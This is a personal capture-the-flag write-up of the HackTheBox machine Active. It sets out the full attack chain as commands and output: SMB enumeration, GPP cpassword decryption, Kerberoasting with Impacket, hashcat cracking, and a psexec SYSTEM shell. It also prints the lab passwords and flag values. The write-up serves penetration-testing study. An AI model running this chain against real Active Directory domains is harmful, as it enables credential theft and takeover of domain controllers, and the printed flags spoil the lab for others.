# Kerberoasting involved, query AD, get hash, and crack it.

## Using nmap:
for this windows box we want to use nmap for Enum.
nmap -sCV [target IP]

-from our scan we identify

Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 13:01 -0400
Nmap scan report for 10.129.79.197
Host is up (0.078s latency).
Not shown: 975 filtered tcp ports (no-response)
- PORT      STATE  SERVICE       VERSION
- 21/tcp    closed ftp
- 22/tcp    closed ssh
- 23/tcp    closed telnet
- 25/tcp    closed smtp
- 53/tcp    open   domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) 
- | dns-nsid: 
- |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
- 88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-06 17:01:42Z)
- 113/tcp   closed ident
- 135/tcp   open   msrpc         Microsoft Windows RPC
- 139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
- 199/tcp   closed smux
- 389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
- 445/tcp   open   microsoft-ds?
- 464/tcp   open   kpasswd5?
- 587/tcp   closed submission
- 593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
- 636/tcp   open   tcpwrapped
- 3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
- 3269/tcp  open   tcpwrapped
- 5900/tcp  closed vnc
- 49152/tcp open   msrpc         Microsoft Windows RPC
- 49153/tcp open   msrpc         Microsoft Windows RPC
- 49154/tcp open   msrpc         Microsoft Windows RPC
- 49155/tcp open   msrpc         Microsoft Windows RPC
- 49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
- 49158/tcp open   msrpc         Microsoft Windows RPC
- Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

_Host script results:_
| smb2-time: 
|   date: 2026-10-06T17:02:38
|_  start_date: 2026-10-06T16:24:11
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.07 seconds

### silly stuff
DNS 6.1.7601 == windows 7 or Windows server 2008 R2 SP1

for nslookup you have a define a server and assign it an IP, so type "server [target IP]" before moving forward

now we can use the active.htb url we found

we type "> active.htb"

and get the domain name back as "active.htb", shocker

using command "locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
## we are left with these nmap scripts:

- /usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse:categories = {"vuln", "safe", "malware"}
- /usr/share/nmap/scripts/smb-enum-services.nse:categories = {"discovery","intrusive","safe"}
- /usr/share/nmap/scripts/smb-ls.nse:categories = {"discovery", "safe"}
- /usr/share/nmap/scripts/smb-mbenum.nse:categories = {"discovery", "safe"}
- /usr/share/nmap/scripts/smb-os-discovery.nse:categories = {"default", "discovery", "safe"}
- /usr/share/nmap/scripts/smb-protocols.nse:categories = {"safe", "discovery"}
- /usr/share/nmap/scripts/smb-security-mode.nse:categories = {"default", "discovery", "safe"}
- /usr/share/nmap/scripts/smb-vuln-ms17-010.nse:categories = {"vuln", "safe"}
- /usr/share/nmap/scripts/smb2-capabilities.nse:categories = {"safe", "discovery"}
- /usr/share/nmap/scripts/smb2-security-mode.nse:categories = {"safe", "discovery", "default"}
- /usr/share/nmap/scripts/smb2-time.nse:categories = {"discovery", "safe", "default"}
- /usr/share/nmap/scripts/smb2-vuln-uptime.nse:categories = {"vuln", "safe"}


## we now use this nmap command:
nmap -Pn -p 445 -sV --script safe 10.10.10.100

smb2-security-mode: 2:1:0:
	Message signing enabled and required

## now SMB stuff:
crackmapexec smb 10.129.76.174 --shares -u '' -p '' -M gpp_password


NOW WE GET THIS:
SMB         10.129.76.174   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.76.174   445    DC               [+] active.htb\: 
SMB         10.129.76.174   445    DC               [*] Enumerated shares
SMB         10.129.76.174   445    DC               Share           Permissions     Remark
SMB         10.129.76.174   445    DC               -----           -----------     ------
SMB         10.129.76.174   445    DC               ADMIN$                          Remote Admin
SMB         10.129.76.174   445    DC               C$                              Default share
SMB         10.129.76.174   445    DC               IPC$                            Remote IPC
SMB         10.129.76.174   445    DC               NETLOGON                        Logon server share 
SMB         10.129.76.174   445    DC               Replication     READ            
SMB         10.129.76.174   445    DC               SYSVOL                          Logon server share 

## [IMPORTANT] Use NetExec to Find and Download the Groups.xml File:
Run this command to search the Replication share for files containing the word "Groups":

nxc smb 10.129.76.174 -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True

SMB         10.129.76.174   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.76.174   445    DC               [+] active.htb\: 
SPIDER_PLUS 10.129.76.174   445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.76.174   445    DC               [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS 10.129.76.174   445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.76.174   445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.76.174   445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.76.174   445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.76.174   445    DC               [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus
SMB         10.129.76.174   445    DC               [*] Enumerated shares
SMB         10.129.76.174   445    DC               Share           Permissions     Remark
SMB         10.129.76.174   445    DC               -----           -----------     ------
SMB         10.129.76.174   445    DC               ADMIN$                          Remote Admin
SMB         10.129.76.174   445    DC               C$                              Default share
SMB         10.129.76.174   445    DC               IPC$                            Remote IPC
SMB         10.129.76.174   445    DC               NETLOGON                        Logon server share 
SMB         10.129.76.174   445    DC               Replication     READ            
SMB         10.129.76.174   445    DC               SYSVOL                          Logon server share 
SMB         10.129.76.174   445    DC               Users                           
SPIDER_PLUS 10.129.76.174   445    DC               [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.129.76.174.json".
SPIDER_PLUS 10.129.76.174   445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Replication, SYSVOL, Users)
SPIDER_PLUS 10.129.76.174   445    DC               [*] SMB Readable Shares:  1 (Replication)
SPIDER_PLUS 10.129.76.174   445    DC               [*] Total folders found:  22
SPIDER_PLUS 10.129.76.174   445    DC               [*] Total files found:    7
SPIDER_PLUS 10.129.76.174   445    DC               [*] File size average:    1.16 KB
SPIDER_PLUS 10.129.76.174   445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.129.76.174   445    DC               [*] File size max:        3.63 KB
SPIDER_PLUS 10.129.76.174   445    DC               [*] File unique exts:     4 (pol, inf, xml, ini)
SPIDER_PLUS 10.129.76.174   445    DC               [*] Downloads successful: 7
SPIDER_PLUS 10.129.76.174   445    DC               [+] All files processed successfully.

## Now find the downloaded cpassword file, we can see the file path from SPIDER PLUS:

grep -i "cpassword" -r /root/.nxc/modules/nxc_spider_plus/

we get cpassword of "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

using gpp-decrpyt we can get the password.

gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

## we get the password: GPPstillStandingStrong2k18
## we also get the username SVC_TGS from the spiderplus report from out of nxc

# now LETS USE THESE CREDENTIALS TO LOG IN:

nxc smb 10.129.76.174 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'

SMB         10.129.76.174   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.76.174   445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 

ok now time for kerberoasting:

Impacket's ticket dumping is good for this. Replace 10.129.76.174 with the target IP if your active target box IP ever shifts:

impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.76.174 -request -outputfile hashes.kerberoast

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-10-06 13:29:52.367346             



[-] CCache file is not found. Skipping...


To force the tool to download the actual ticket hash structure to your machine, re-run the script adding the -request flag explicitly at the end:

impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.76.174 -request -outputfile hashes.kerberoast

LETS READ that thing*:
cat hashes.kerberoast

WE GET THIS:
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$789bd11aa5b6414c14f5bd9e74714528$4f159468b9f8599783d5ba0d9c5b9de900d982efde162eab848c9cd18035fdac8fa872c3202510f50016bf8e89eaee519df38cb168ba43c14e8e871815dc1c9162b35833ede0f82acd9fd44c097153ba82c4fcdc39361d1f9c87118c6055670719cb1721388d455f14dbb547ef84e837b2878a0d9d01b54be002e80654523313e9034619de157991e1aaf6d69dd956b430ef52048357d4e43618d766f27bb301440a6178fc1da81b266c9e6e653e74a994d627acf388aaafd1750855df70c41cbcb25c45282fb72544c45daa30a613e1317ebfbf1156691ac00982d1edf6b47300151ca9d2e099b5a13e827d6afe510a4e8ef5cbd0645f4690626bc85517d7c8fbca6bd1d9ed675909d7b8118814a9f85ad3360342663d2de086b678bac1f45401ea23f386f13eea1ac32c32ba7037ad0044f2a5d40f881e37525ac7a3ccfb52809bcd93362c7cb1edb7e1792aa4eb6804307f4bb02840740f417f6492d93b72c62cf5744007f423eb4bdde83abbcbcbf5bae625057b4aec5074276c5c3efe64b4261d680358e78c85076943247f1a792adc5f4801cac77b63cbbab3eeb58c0733f801f3d8868014a22eadd1f98127fae2eddaefccef61dbbf88f8c9df50f72d585e846eeae438c72dfa734daf5d73daed750e3132076b4b0bae5b1182ffcc94ec4b8793567b032124b5df96660bada9ee1d5ccc10fb6b5251ab09550ae794ddddd15cec11a461efafae9c4ca715284c0e4d970bd2cbfca53efb158aaa26c42ade81c7e576f54471367ecbc147cc432d19b8cf67918312d2dba1dc9bbf8694f85cf2819a0055eace275c1315a52c1e77770a9d9647ca45e20f9ba9f4e99f0e09d1d4b002fd253ff944cb74cf40140de3b06b3c350cf5fc59e8fff5df4993a83e1c57d1848eb36bf8aefd19373215309e9d1189d0388970a4bde6b171413cb6a63b8ad938395c4b3a32ed6eab6d53715f5be670defc529fe17fc611263ac66b8fdf75a46dfc1e76dee8930863f3dd36ff684dbe8aaee77946ad17e55c50d45a532784b13fd7ff00e29ec09cf0df47346433abecc0622537bb5252c0985b036bd7839a9056fefdaf27f920ff17a83d2de2f44fd160e61fb94d44ff2078f747f3c469003269114cf73746c555997b6f20dd76fb468781db7ba8c87973783b5d8ef687a0f860b5d27c1b6e8c5934974fcffcfa2559890af0fe1711beb3737e769d551d3622c5757c6bcc95742f2b2473e62a41a3f52c5d4941ad21d3

UNZIP rockyou.txt:
locate rockyou.txt

## NOW WE HASHCAT USING MODE 13100:
hashcat -m 13100 hashes.kerberoast /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt



to get:
## username: Administrator
## password: Ticketmaster1968

now lets try logging in with our credentials:
ok we are now logged in with an administrator account:
SMB         10.129.76.174   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.76.174   445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)

NOW WE NEED A SHELL!:
Run Impacket's psexec.py utility from your terminal to establish a stable nt authority\system command prompt:

impacket-psexec active.htb/Administrator:Ticketmaster1968@10.129.76.174


## and finally... lets find our flags:

C:\Users\SVC_TGS\Desktop\user.txt
842ce83606ee22a3eb710e98f32bf671


C:\Users\Administrator\Desktop\root.txt
aa01de0ebb7f2527c6be92c7ea971649

writeup by marp.sec
following Ippsec's tutorial for machine Active by HackTheBox

